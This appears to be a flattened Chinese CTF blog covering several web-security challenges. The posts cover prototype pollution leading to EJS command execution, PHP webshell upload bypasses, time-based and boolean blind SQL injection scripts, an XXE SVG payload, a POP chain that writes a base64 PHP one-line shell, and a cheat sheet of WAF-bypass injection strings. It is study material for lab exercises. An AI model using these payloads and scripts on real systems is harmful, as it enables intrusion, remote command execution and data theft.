哪些情况下原型链会被污染？在含有能够控制数组（对象）的“键名”的操作即可，一般是以出现：merge和clone对象 不安全的对象递归合并以merge,因为merge执行的就是递归，为例，先构造一个简单的merge函数 const merge = (target, source) =&gt; { // Iterate through `source` properties and if an `Object` set property to merge of `target` and `source` properties for (const key of Object.keys(source)) { if (source[key] instanceof Object) Object.assign(source[key], merge(target[key], source[key])) } // Join `target` and modified `source` Object.assign(target || {}, source) return target}function Person(name,age,gender){//构造一个person类 this.name=name; this.age=age; this.gender=gender;}let newperson=new Person(&quot;test1&quot;,22,&quot;male&quot;);let job=JSON.parse('{&quot;title&quot;:&quot;Security Engineer&quot;,&quot;country&quot;:&quot;China&quot;,&quot;__proto__&quot;:{&quot;x&quot;:1}}');//新建一个job对象merge(newperson,job);//这个job对象有用title、contry、__proto__属性，并对其进行赋值console.log(newperson);console.log(Person.prototype);//此时per的原型已经被改变为x=1 这里解释一下，merge将这几个键值作为一个属性合并到newperson这个对象中了，merge函数执行的其实可以认为是 Person.job.title=......Person.job.__proto__=.... 这个时候job的原型是Person，所以Person的值就发生了改变。 按路径定义属性有些JavaScript库的函数支持根据指定的路径修改或定义对象的属性值。通常这些函数类似以下的形式：theFunction(object, path, value)，将对象object的指定路径path上的属性值修改为value。如果攻击者可以控制路径path的值，那么将路径设置为_proto_.theValue，运行theFunction函数之后就有可能将theValue属性注入到object的原型中。 实战www.zip下载源码： 然后开始审计 const merge = (a, b) =&gt; { for (var attr in b) { if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a}const clone = (a) =&gt; { return merge({}, a); 在index.js找到merge和clone，接下来看看有哪里调用了他们，发现是在/action这里，并且需要user为admin router.post('/action', function (req, res) { if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;&quot;)} req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;&quot;); }); 那么就需要先登录，在登录这列发现 **其中 'user':req.body.userid.toUpperCase() 这一句中toUpperCase()函数是为了将字符串中的小写字符转换成大写，但因为javascript的特性，函数存在分险（下图），所以假如我们传入admın的话，经过toUpperCase()的处理后，会变成ADMIN**关于node-js题目的尝试/9.png) 在javascript中有几个特殊的字符需要记录一下 对于toUpperCase(): 字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;Copy 对于toLowerCase(): 字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K) 所以我们可以注册用户名为admın然后进行登录即可，接下来在去可以污染的参数那边看看该如何构造payload首先可以可以看到clone在login那边对body进行操作，那么我们的原型链传入的值也应该在那里 router.post('/action', function (req, res) { if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;&quot;)} req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;&quot;); }); 再往下看,我们outputoFunctionName被渲染了，那么其实思路就很明确了，通过clone原型链污染outputoFunctionName，导致其值被改变，渲染拿到flag router.get('/info', function (req, res) { res.render('index',data={'user':res.outputFunctionName});}) payload: {&quot;__proto__&quot;:{&quot;outputFunctionName&quot;: &quot;test;clearTimeout.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag &gt; /app/public/reader').toString();var test1&quot;}} 从语法的角度解释一下这个payload：我们通过污染outputFunctionName的原型，通过constructor访问其向上原型链，获得主环境的function，2然后通过(‘return process’)()获得主环境process变量，通过process.mainModule.require导入child_process模块，实现命令执行,最后将flag输出至/reader中，由于这个outputFunctionName是未定义的，所以我们后面访问它，就会直接赋值为我们定义的这些属性（和上面的原理是一样的） 来自：https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/ 要记得吧传输的内容格式改为json的，然后登陆/info让其被渲染，然后再登录/reader将flag下载下来即可 小结由于语法还是有很多不懂，但还好学沙盒逃逸的时候有掌握一点语法，所以原理还是可以看懂的，但是构造语句还是不太行总结一下js的原型链污染1.寻找merge或者clone函数2.寻找使用这两个函数的对象，查看其是否可控，能渲染 https://www.freebuf.com/articles/web/275619.html https://www.cnblogs.com/LEOGG321/p/13448463.html js的字符：https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html","link":"/2021/07/22/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"title":"buu24","text":"[红明谷CTF 2021]write_shell首先是check函数过滤了一些字符 function check($input){ if(preg_match(&quot;/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i&quot;,$input)){ // if(preg_match(&quot;/'| |_|=|php/&quot;,$input)){ die('hacker!!!'); }else{ return $input; }} 如果传入的是数组，那么就会进行foreach再对其键值进行check函数的过滤 function waf($input){ if(is_array($input)){ foreach($input as $key=&gt;$output){ $input[$key] = waf($output); } }else{ $input = check($input); }} 经过waf后的内容将会被传入index.php中 case 'upload': $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data); 现在需要想的就是如何构造shell，过滤了php我们可以使用短标签进行绕过，过滤了 过滤了php我们可以使用.进行连接，过滤了空格，我们可以使用括号进行绕过， /?action=upload&amp;data=&lt;?=(ph.pinfo)()?&gt; 绕过成功 /?action=upload&amp;data=&lt;?=`ls%09/`?&gt; 接下来就是cat它就好了 [SWPU2019]Web4测试了一下 发现是堆叠注入，但是没有输出回显信息，也不符合布尔盲注的条件 那就要考虑一下时间盲注了，接下来构造一下语句,尝试了一下select sleep(5)，发现没有反应，猜测存在过滤，堆叠注入的绕过有一个预处理，可以采取使用concat连接的方式进行绕过 但是由于不确定都过滤了那些内容，虽然可以使用延迟进行fuzz，但是有点麻烦，可以直接采用十六进制转码的形式进行绕过 import requestsimport jsonimport timedef main(): #题目地址 url = '''http://5c6e0550-a9af-461f-8eda-50bc9d0086f0.node4.buuoj.cn/index.php?r=Login/Login''' #注入payload payloads = &quot;asd';set @a=0x{0};prepare ctftest from @a;execute ctftest-- -&quot; flag = '' for i in range(1,30): #查询payload payload = &quot;select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)&quot; for j in range(0,128): #将构造好的payload进行16进制转码和json转码 datas = {'username':payloads.format(str_to_hex(payload.format(i,j))),'password':'test213'} data = json.dumps(datas) times = time.time() res = requests.post(url = url, data = data) if time.time() - times &gt;= 3: flag = flag + chr(j) print(flag) breakdef str_to_hex(s): return ''.join([hex(ord(c)).replace('0x', '') for c in s])if __name__ == '__main__': main() 这个是网上大神的脚本，我的好像出了点问题，没跑出来–得到glzjin_wants_a_girl_friend.zip里面是源码，接下来审计一下：打开controllers进行审计，可以发现basecontrollers中，有文件包含，那么我看看这个viewData是用extract() 函数从数组中将变量导入到当前的符号表。如果可以控制这个viewdata，那么就可以实现变量覆盖了 class BaseController{ /* * 加载视图文件 * viewName 视图名称 * viewData 视图分配数据 */ private $viewPath; public function loadView($viewName ='', $viewData = []) { $this-&gt;viewPath = BASE_PATH . &quot;/View/{$viewName}.php&quot;; if(file_exists($this-&gt;viewPath)) { extract($viewData); include $this-&gt;viewPath; } } } 而这个load方法只在user里面看到，并且listDAT是有request获得的 去userIndex里面查看一下这里的变量是img_file理一下思路，我们可以使用extract需要变量覆盖，传入的值是也是可控的，用request，所以构造payload,首先我们得先到user这个路由这里 不过对于这个传值还是想研究一下，所以在phpstorm里面断点调试一下 为什么要是img，因为后面是这个变量的内容会回显在网页上，也就是这个图片 [BSidesCF 2019]SVGMagic题目说将svg转为png，svg是用xml格式定义的图像，推测是xxe注入 在本地先编写一个svg文件 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note[&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;]&gt;&lt;svg width=&quot;2000&quot; height=&quot;100&quot;&gt;&lt;text x=&quot;100&quot; y=&quot;100&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt; 然后将其上传即可 [DDCTF 2019]homebrew event looppython源码审计 将event写入session函数 def trigger_event(event): session['log'].append(event) if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) 有三个points，0个num_items，但是不清楚有什么是写在session中的 这里num_items要大于等于5 flag就会被写入session 如果我们可以先买钻石，然后让flag被写入session中，然后再扣费，那就可以实现num_items大于等于5，可以看到这里有一个eval函数： 因为eval函数后面的参数可控所以 action:trigger_event%23;action:buy;5%23action:get_flag; 然后使用flask-session-manager-master解密session即可获得flag","link":"/2021/07/26/buu24/"},{"title":"buu25","text":"[EIS 2019]EzPOP找到一个危险函数根据此函数往前看看是否能传值进去这里有个exit()，好像不会执行后面data的内容，这里待会需要想办法绕过，但是首先需要弄懂将值传入的链 data首先可能会经过一个压缩的操作为了不让data发生改变，我们就需要将data_compress设为0 接下来会经过一个serialize的函数操作，如果为数字，那么就会返回string的data，那我们可以先让我们data会string类型，后面因为serialize()可以看成是一个函数的执行，并且serialize可以由我们直接赋值，这里可以使用strval函数。向上是set函数没传入这些值，其中value就是对应我们后面的data 往上对应来自于class A中的content中，而这里的store需要赋值为classB中，不然找不到set方法 在往上看到来自于cleanContents中的cache，这个在前面的定义中没有看到，所以我们可以直接自己定义一下这个变量，看到下面还有一个json_encode为了防止被json_encode，我们这里还需要将complete设置为0这样子的话就可以避免被json_encode 最后再向上来到construct这里，这里有对store进行赋值，这里需要赋值为new B 现在整理一下编写pop链条： &lt;?phpclass A{ public $store; public $key=&quot;a.php&quot;; public $expire; public $cache; public $complete; public function __construct($store) { $this-&gt;store=$store; }}class B{ public $options;}$b=new B();$b-&gt;options=array('data_compress'=&gt;0,'expire'=&gt;0,'serialize'=&gt;'strval');$a=new A($b);$a-&gt;cache=array(1=&gt;array(1=&gt;1));$a-&gt;complete=0;$a-&gt;key=1;$a-&gt;expire=null;echo serialize($a); 现在的难点在于我们写入的内容前面有一个exit()这样的话，我们写入的内容将不会被执行，参考https://www.leavesongs.com/PENETRATION/php-filter-magic.html这里介绍的方法是这样的：先使用php://filter/wtrite=convert.base64.decode/resource=./uploads/伪协议，对原本文件中的内容进行base64编码后的读取，除掉那些&lt;?的特殊字符，我们只会对phpexit进行base64编码，我们传入的内容也需要是base64加密，但是我们可以多传入几个字符，打乱前面的加密base64加密方式：第一步，将待转换的字符串每三个字节分为一组，每个字节占8bit，那么共有24个二进制位。第二步，将上面的24个二进制位每6个一组，共分为4组。第三步，在每组前面添加两个0，每组由6个变为8个二进制位，总共32个二进制位，即四个字节。第四步，根据Base64编码对照表（见下图）获得对应的值。反过来，base64解码时，一定是4个有效字节为一组进行解码 所以说这里要跟踪一下content传入的值，可以发现最终传入的值为第一个数组的键值，以及嵌套后的数组的键值拼接以后即变成，因为接下来由于我们使用的伪协议的decode打开，所以前面这些将被base64解密回去，变成乱码 exit就消失了 phpexit111 这里是一句话木马 接下来写一下pop链： &lt;?phpclass A{ public $store; public $key=&quot;a.php&quot;; public $expire; public $cache; public $complete; public function __construct($store) { $this-&gt;store=$store; }}class B{ public $options;}$b=new B();$b-&gt;options=array('data_compress'=&gt;0,'expire'=&gt;0,'serialize'=&gt;'strval','prefix'=&gt;'php://filter/write=convert.base64-decode/resource=./uploads/');$a=new A($b);$a-&gt;cache=array(111=&gt;array('path'=&gt;&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/PmFhYWFh&quot;));$a-&gt;complete=1;$a-&gt;key='shell.php';$a-&gt;expire=null;echo urlencode(serialize($a)); 小结：这道题的坑点还挺多的1.存在许多可能改变data的函数，但是都可以绕过2.传入的数组需要为双重数组，具体是为什么可以在phpstorm中调试一下，并且我们的内容的键名还必须是他要求的那几个才会被识别进入content3.exit的绕过需要了解base64的加密方式，然后后面的payload，在我们传入的时候后面需要再添加几个字母来补齐，防止前面的内容在解密的时候被吃掉","link":"/2021/07/27/buu25/"},{"title":"sql盲注深入学习","text":"sql注入语句整理这里整理一下绕过了大部分waf的语句 union联合注入:过滤了空格-1'union/*a*/select/*a*/1,group_concat(table_name),3/*a*/from/*a*/information_schema.tables/*a*/where/*a*/table_schema=database()--+-1'union/*a*/select/*a*/1,group_concat(column_name),3/*a*/from/*a*/information_schema.columns/*a*/where/*a*/table_name='fl4g'--+-1'union/*a*/select/*a*/1,fllllag,3/*a*/from/*a*/fl4g--+ 过滤了table表-1'union/*a*/select/*a*/1,group_concat(table_name),3/*a*/from/*a*/sys.schema_auto_increment_columns/**/where/**/tabe_schema=database()--+-1'union/*a*/select/*a*/1,group_concat(table_name),3/**/from/*a*/mysql.innodb_table_stats/*a*/where/*a*/database_name=database()--+-1'union/*a*/select/*a*/1,fllllag,3/*a*/from/*a*/fl4g--+ 报错注入1'and/**/extractvalue('~',concat('~',database()))--+1'and/**/extractvalue('~',concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+1'and/**/extractvalue('~',concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users')))--+ sql盲注字符串截取问题1.substr()/substring()语法：substr(str,pos)，截取从pos位置开始到最后的所有str字符串 ​ substr(str，pos,len)​ substr(str from pos for len)​ substr(str from pos) 两种等价形式： 2.mid()sql mid()函数用遇得到一个字符串的一部分，这个函数被MYSQL支持，但不被MS SQL Server 和Oracle支持。在SQL Server、Oracle数据库中，我们可以使用SQLsubstring或者sql substr函数作为替代在mysql中和substr基本一样mid必须要三个参数 3.right+ascii语法：ascii(right(str,pos)) 4.left+reverse+asciileft只能显示第一个字符的ascii码，所以每次截取新的出来都需要用reverse翻转更新该ascii码 比较问题1.等于2.大于小于3.likesql中like自居使用百分号%字符来表示任意字符，类似于unix或正则表达式中的星号*。如果没有使用百分号%,like字句与等号=的效果是一样的 4.正则表达式regexp rlike语法：regexp &quot;^str&quot; regexp和rlike是不区分大小写的，需要大小写敏感要加上binary关键字 5.between 6.in 也是大小写不敏感，字符和数字都可用，也有not in 7.AND逻辑与运算符1和真与还是真下面的逻辑运算的都一样 8.比较 or逻辑运算符9.异或运算符10.order by比较盲注语句：select x union select yzk order by 1; 如果x&lt;y那么排序的第一个会是x，如果x&gt;y那么排序第一个是y，更改的那一瞬间就会发生改变， 图中表箭头的是可以修改的可以发现布尔值更改的前一个就是真的 11.casecase exp1 when exp2 then exp3 else exp4 end; 这个语句的意思是：if exp1==exp2: return exp3else return exp4 12.if13.trim()trim():删除前后空格、rtrim():删除字符串结尾空格、ltrim():删除字符串起始空格语法：trim(both/leading/tring 目标字符串 from 源字符串) 利用：可以发现有不一样的回显 写成比较语句如下： 如果=号用regexp替代 那么正确的字符一定在regexp前面 所以应该是正确的那个在后面 14.insert()insert(字符串，起始长度，长度，替换为什么) 这样就可以按位截取字符 -1'/**/group/**/by/**/23,' -1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 -1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22' -1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'","link":"/2021/07/29/sql%E7%9B%B2%E6%B3%A8%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"title":"2021-hf-hatenum复现","text":"前言今天主要跟着YING师父的wp学习一下其中的知识点~ 分析源码在login函数中看到，有三种回显，一种是成功，另外一个是error还有一个是fail，所以我们应该构造一个语句，可以有回显error还有fail，那么就是一个要报错一个要false function login($username,$password,$code){ $res = $this-&gt;conn-&gt;query(&quot;select * from users where username='$username' and password='$password'&quot;); if($this-&gt;conn-&gt;error){ return 'error'; } else{ $content = $res-&gt;fetch_array(); if($content['code']===$_POST['code']){ $_SESSION['username'] = $content['username']; return 'success'; } else{ return 'fail'; } } }} 这里过滤了一系列字符,包括union，select，这里最糟糕的是他过滤了单引号，因为我们通常是采用单引号来闭合语句的 function sql_waf($str){ if(preg_match('/union|select|or|and|\\'|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\\*|,|;|\\r|\\n|\\t|substr|right|left|mid/i', $str)){ die('Hack detected'); }} 还有一个字符数目限制，限制字符长度在9个以内 function num_waf($str){ if(preg_match('/\\d{9}|0x[0-9a-f]{9}/i',$str)){ die('Huge num detected'); }} 引号绕过由于本题只需要登录即可，所以我们只要获取密码就行了，那么就可以利用源码里面自带的查询语句，这样没有select也没关系，但是引号如何闭合绕过呢？查询语句是这样的：那我们只需要在第二个引号的位置加一下反斜杠将它转义，然后将我们要注入的内容放在password字段 &quot;select * from users where username='$username' and password='$password'&quot; 所以就如下： &quot;select * from users where username='$username\\' and password='||`username`='admin'后面再加上你的注入语句#&quot; 布尔盲注语句构造条件语句的选取：由于比较符号都被过滤了，如果使用if显然是不够的，这里我们使用case when初步语句构造为： case '' when '' then '' else '' end# 后面then和else一个发报错的一个放查询错误的 报错函数选取报错函数可以用cot(0)或者exp(9999999999999999)都是三角函数 截取函数选择由于这里将substr等截取函数都过滤了，所以选择trim()函数 trim(leading''from'')rlike(trim(leading''from'')) 这个语句我们在mysql中测试一下将会更直观一些： trim(leading('a')from(`password`)) rlike trim(leading('b')from(`password`)) 和条件语句组合后即为：以下语句的意思即为如果两个trim的结果如果一致则为1 那么就不是0 那么就会返回1，如果两个trim的结果不一致，那么就会返回0就会返回cot(0) case trim(leading 'a' from `password`) rlike trim(leading 'b' from `password`) when 0 then cot(0) else 1 end 可以发现如果截取到密码的字符，那么就会返回错误，否则就会返回表，查询结果即为false 长度绕过：由于我们不能输入引号，所以说字符串都需要转为十六进制进行输入，但是转为十六进制的势必会超过9位数，所以我们可以利用hex和unhex函数缩短长度：先用十进制表示转为十六进制的字符串，那么此时 我们就可以用运算符以及科学技术法，那么位数将会减少很多了，最后再将结果转为十六进制即可 select admin;select unhex(hex(4182e8+96719726e0)); 但是字符取到后面还是会超过9位，此时需要另一种方法来截取，那就是使用函数嵌套,我们的问题在于，到后面过多的取字符以后比如说密码为abc，取了abc，那么他们即使转为十进制+科学计数法+运算符，也还是会超过9位，所以我们需要使用嵌套，一部分一部分的取，如下 def recursion_g_code(l:list): def g_code(prefix, code): return f&quot;trim(leading({wrap_str(prefix)})from({code}))&quot; code = &quot;'code'&quot; for i in l: code = f'''g_code(&quot;{i}&quot;, {code})''' return eval(code) 脚本我自己肯定写不出来这么厉害的脚本。。。代码编写能力还是太差，所以就仿照一下自己理解的编写一下：首先是第一段字符串转数字：通过每次取余八位，将后面的数字内容先截取出来，然后转变为科学计数法，然后再将剩下的数字以科学计数法表示 import requests as reqimport stringfrom Crypto.Util.number import bytes_to_long#从crypto中导入bytes_to_long函数，这个函数可以将字符串转为长整数url=&quot;&quot;&quot;字符串转unhex(hex())&quot;def wrap_str(s:str): def split_num(num:int): p=8 m=pow(10,p) parts=[] i=0 while num &gt;0: parts.insert(0,f&quot;{num % m}e{i}&quot;)#insert函数是对list进行操作，表示，第一个数字表示操作的位置，第二个表示插入的内容 i+=p num = num // m if i &gt;=100: raise RuntimeError(&quot;todo&quot;) return &quot;+&quot;.join(parts) s=s.encode() return f&quot;unhex(hex({split_num(bytes_to_long(s))}))&quot; 第二段 trim的套娃 def recursion_g_code(l:list): def g_code(prefix, code): return f&quot;trim(leading({wrap_str(prefix)})from({code}))&quot; code = &quot;'code'&quot; for i in l: code = f'''g_code(&quot;{i}&quot;, {code})''' return eval(code) trim(leading(unhex(hex(5033e8+70115431e0)))from(trim(leading(unhex(hex(30057e0)))from(trim(leading(unhex(hex(12851e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(30073e0)))from(trim(leading(unhex(hex(26674e0)))from(trim(leading(unhex(hex(26983e0)))from(trim(leading(unhex(hex(29301e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(25970e0)))from(code))))))))))))))))))))rlike(trim(leading(unhex(hex(5033e8+70115432e0)))from(trim(leading(unhex(hex(30057e0)))from(trim(leading(unhex(hex(12851e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(30073e0)))from(trim(leading(unhex(hex(26674e0)))from(trim(leading(unhex(hex(26983e0)))from(trim(leading(unhex(hex(29301e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(25970e0)))from(code))))))))))))))))))))) 可以看到分别是对这三个部分进行递归嵌套 知识点小结：1.引号绕过，两个参数均可控的情况下2.case when else end3.trim函数截取4.字符串转化为大数化短5.记一点小坑，就是在post请求的时候需要allow_redirects=False，否则的话无法接收到正确的报文，原因是源码中在post请求后会有header(location)进行重定向","link":"/2021/08/02/2021-hf-hatenum%E5%A4%8D%E7%8E%B0/"},{"title":"buu26","text":"[b01lers2020]Life on Marsburp抓包，发现有参数，尝试一下sql注入，发现为数字型注入，使用union联合注入，字段数为2，并且回显在最后一个位置 接下来就开始 amazonis_planitia%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='aliens'--+ 发现表都是一样的，感觉有点奇怪，于是再回去看看有没有其他库，但是确实只有一个库，看了一下wp发现是要用sqlmap跑一下，有一个code库 然后手工注入一下： search=amazonis_planitia union select group_concat(id),group_concat(code) from alien_code.code--+ [GXYCTF2019]BabysqliV3.0查看源码，发现一个Unicode，解码以后是一个一开始没反应过来，后来想想，它的意思应该是提示这是一个弱口令跑了一下发现admin/password可以登录登陆以后发现有文件包含，用伪协议尝试读一下源码试试看 ?file=php://filter/read=convert.base64-encode/resource=home &lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_SESSION['user'])){ if(isset($_GET['file'])){ if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET['file'])){ die(&quot;hacker!&quot;); } else{ if(preg_match(&quot;/home$/i&quot;, $_GET['file']) or preg_match(&quot;/upload$/i&quot;, $_GET['file'])){ $file = $_GET['file'].&quot;.php&quot;; } else{ $file = $_GET['file'].&quot;.fxxkyou!&quot;; } echo &quot;å½åå¼ç¨çæ¯ &quot;.$file; require $file; } } else{ die(&quot;no permission!&quot;); }}?&gt; 根据过滤内容，应该是有一个名为flag的文件夹存储着flag再来读一下upload.php的文件内0容 &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; ä¸ä¼ æä»¶ &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸ä¼ &quot; /&gt;&lt;/form&gt;&lt;?phperror_reporting(0);class Uploader{ public $Filename; public $cmd; public $token; function __construct(){ $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION['user']).&quot;/&quot;; $ext = &quot;.txt&quot;; @mkdir($sandbox, 0777, true); if(isset($_GET['name']) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET['name'])){ $this-&gt;Filename = $_GET['name']; } else{ $this-&gt;Filename = $sandbox.$_SESSION['user'].$ext; } $this-&gt;cmd = &quot;echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';&quot;; $this-&gt;token = $_SESSION['user']; } function upload($file){ global $sandbox; global $ext; if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){ $this-&gt;cmd = &quot;die('illegal filename!');&quot;; } else{ if($file['size'] &gt; 1024){ $this-&gt;cmd = &quot;die('you are too big (â²â½`ã)');&quot;; } else{ $this-&gt;cmd = &quot;move_uploaded_file('&quot;.$file['tmp_name'].&quot;', '&quot; . $this-&gt;Filename . &quot;');&quot;; } } } function __toString(){ global $sandbox; global $ext; // return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; } function __destruct(){ if($this-&gt;token != $_SESSION['user']){ $this-&gt;cmd = &quot;die('check token falied!');&quot;; } eval($this-&gt;cmd); }}if(isset($_FILES['file'])) { $uploader = new Uploader(); $uploader-&gt;upload($_FILES[&quot;file&quot;]); if(@file_get_contents($uploader)){ echo &quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;; echo file_get_contents($uploader); }}?&gt; 文件+序列化，并且没有反序列化的点，那么就是phar反序列化","link":"/2021/07/30/buu26/"},{"title":"SQL二次注入-GACTF-carefulleyes","text":"源码审计首先看看题目的源码，rename.php在这里是存在二次注入的，新的文件名会替换旧的文件名，新文件名又将被直接取出 &lt;?phprequire_once &quot;common.php&quot;;if (isset($req['oldname']) &amp;&amp; isset($req['newname'])) { $result = $db-&gt;query(&quot;select * from `file` where `filename`='{$req['oldname']}'&quot;); if ($result-&gt;num_rows &gt; 0) { $result = $result-&gt;fetch_assoc(); $info = $db-&gt;query(&quot;select * from `file` where `filename`='{$result['filename']}'&quot;); $info = $info-&gt;fetch_assoc(); echo &quot;oldfilename : &quot;.$info['filename'].&quot; will be changed.&quot;; } else { exit(&quot;old file doesn't exists!&quot;); }} 大致分析一下：假设我们输入的文件名为：1'or 1=1#.jpg那么插入到数据库当中以后将变成1'or 1=1#那么后面取出数据的时候 select * from `file` where `filename`='{$result['filename']}'select * from `file` where `filename`='1'or 1=1#' 一开始测试的时候 我是用and的，但是当我改成1’and 1=2的时候回显结果也是一样的？1'and 1=1# 后来我改成了1'or 1=1,发现页面有了不一样的回显 所以可以进行布尔盲注 脚本编写感觉最近写脚本越来越得心应手了虽然脚本都很简单哈哈哈哈 import requestss=requests.session()url1=&quot;http://b.y1ng.vip:2016/upload.php&quot;url2=&quot;http://b.y1ng.vip:2016/rename.php&quot;def upload(str): content=&quot;aaaa&quot; file1 = { 'upfile':(f&quot;1'{str}#.jpg&quot;,content,&quot;image/jpeg&quot;) } r = s.post(url=url1, files=file1).text #print(r)def rename(str): data={ &quot;oldname&quot;:f&quot;1'{str}#&quot;, &quot;newname&quot;:&quot;abc&quot; } r=s.post(url=url2,data=data).text return rdef sql_injection(payload): fina_word=&quot;&quot; for i in range(1,100): low=32 high=128 mid=(low+high)//2 while(low&lt;high): payload_fina=f&quot;or ascii(substr(({payload}),{i},1))&gt;{mid}&quot; upload(payload_fina) r=rename(payload_fina) if &quot;Comp 1_100002&quot; in r: low=mid+1 else: high=mid mid=(low+high)//2 if(mid==32 or mid==128): break fina_word+=chr(mid) print(fina_word)if __name__ ==&quot;__main__&quot;: # payload=&quot;database()&quot; # payload=&quot;&quot; payload=&quot;select group_concat(password) from user&quot; sql_injection(payload) 这样就可以注出用户名和密码了 XM GaCtF5QL1 反序列化分析class XCTFGG{ private $method; private $args; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function login() { list($username, $password) = func_get_args(); $username = strtolower(trim(mysql_escape_string($username))); $password = strtolower(trim(mysql_escape_string($password))); $sql = sprintf(&quot;SELECT * FROM user WHERE username='%s' AND password='%s'&quot;, $username, $password); global $db; $obj = $db-&gt;query($sql); $obj = $obj-&gt;fetch_assoc(); global $FLAG; if ( $obj != false &amp;&amp; $obj['privilege'] == 'admin' ) { die($FLAG); } else { die(&quot;Admin only!&quot;); } } function __destruct() { @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); }} 可以发现，只要登录成功，就可以拿到flag，此时我们已经得到账号密码了，构造一下即可,看了一下源码，在upload.php中存在反序列化的点,方法很少，所以pop链其实很好看出，就是destruct的时候会使用call_user_func_array，所以只要对method和args进行赋值即可： &lt;?phperror_reporting(0);class XCTFGG{ private $method; private $args; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; }}$a=new XCTFGG(&quot;login&quot;,array(&quot;XM&quot;,&quot;GaCtF5QL1&quot;));echo urlencode(serialize($a)); 但是不知道为啥没拿到flag upload successfully!&lt;br /&gt;&lt;b&gt;Fatal error&lt;/b&gt;: Uncaught Error: Call to undefined function mysql_escape_string() in /var/www/html/common.php:39Stack trace:#0 /var/www/html/common.php(59): XCTFGG-&gt;login('XM', 'GaCtF5QL1')#1 /var/www/html/upload.php(47): XCTFGG-&gt;__destruct()#2 {main} thrown in &lt;b&gt;/var/www/html/common.php&lt;/b&gt; on line &lt;b&gt;39&lt;/b&gt;&lt;br /&gt;","link":"/2021/08/09/SQL%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-GACTF-carefulleyes/"},{"title":"sql-无列名盲注","text":"无列名盲注比较法1.fuzz过滤内容fuzz一下 发现select 和union都被过滤了，回顾一下select被过滤有什么能替代的在堆叠注入中可以使用handler，使用预处理拼接绕过，还有mysql的8.0+新版本中的table table 表名; 判断注入类型页面有两种不同的回显方式： 确定使用布尔盲注 编写盲注脚本#payload=&quot;database()&quot;#ctfpayload=&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2 确定版本8.0+使用table进行注入 table information_schema.tables 但是想要获得ctf的那个表的相关列数据，我们还需要自己去注难点：由于table 没有where 